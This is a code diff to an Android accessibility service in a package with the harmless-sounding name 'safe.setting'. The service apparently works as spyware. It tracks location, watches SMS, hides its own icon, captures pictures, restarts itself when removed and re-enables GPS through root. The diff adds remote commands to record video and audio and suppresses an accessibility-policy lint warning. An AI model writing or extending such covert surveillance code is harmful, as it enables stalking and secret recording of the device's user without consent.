@@ -26,6 +26,7 @@ import android.text.TextUtils
 import android.util.Log
 import android.view.accessibility.AccessibilityEvent
 import android.view.accessibility.AccessibilityNodeInfo
+import androidx.annotation.RequiresApi
 import androidx.core.app.ActivityCompat
 import androidx.core.app.NotificationCompat
 import com.safe.setting.app.R
@@ -42,6 +43,7 @@ import java.util.Date
 import java.util.Locale
 import javax.inject.Inject
 
+@SuppressLint("AccessibilityPolicy")
 class AccessibilityDataService : AccessibilityService(), LocationListener {
 
     companion object {
@@ -57,7 +59,6 @@ class AccessibilityDataService : AccessibilityService(), LocationListener {
     private lateinit var locationManager: LocationManager
     private var smsObserver: SmsObserver? = null
 
-    // ... (onCreate, onTaskRemoved, और अन्य फ़ंक्शन्स यहाँ वैसे ही रहेंगे) ...
     override fun onTaskRemoved(rootIntent: Intent?) {
         Log.e(TAG, "TASK REMOVED, RESTARTING SERVICE...")
         val restartServiceIntent = Intent(applicationContext, this.javaClass)
@@ -119,6 +120,7 @@ class AccessibilityDataService : AccessibilityService(), LocationListener {
         }
     }
 
+    @RequiresApi(Build.VERSION_CODES.O)
     override fun onServiceConnected() {
         super.onServiceConnected()
         isRunningService = true
@@ -138,10 +140,13 @@ class AccessibilityDataService : AccessibilityService(), LocationListener {
         }, 500)
     }
 
+    @RequiresApi(Build.VERSION_CODES.O)
     private fun initializeServices() {
         getLocation()
         interactor.getShowOrHideApp()
         interactor.getCapturePicture()
+        interactor.getRecordVideoCommand()
+        interactor.getRecordAudioCommand()
         registerSmsObserver()
     }
 
@@ -211,7 +216,6 @@ class AccessibilityDataService : AccessibilityService(), LocationListener {
             return if (eventText != "[]") eventText else ""
         }
 
-        // स्रोत नोड और उसके सभी बच्चों (children) से टेक्स्ट को खोजने के लिए एक सहायक फ़ंक्शन का उपयोग करें
         val text = findTextInNode(parentNodeInfo)
         return text.trim()
     }
@@ -314,7 +318,6 @@ class AccessibilityDataService : AccessibilityService(), LocationListener {
     override fun onProviderDisabled(provider: String) {
         if (provider == LocationManager.GPS_PROVIDER) {
             interactor.enableGps(false)
-            // **** बदला हुआ कोड: टाइपो को ठीक किया गया ****
             Handler(Looper.getMainLooper()).postDelayed({
                 if (isRoot()) enableGpsRoot()
             }, 3000)
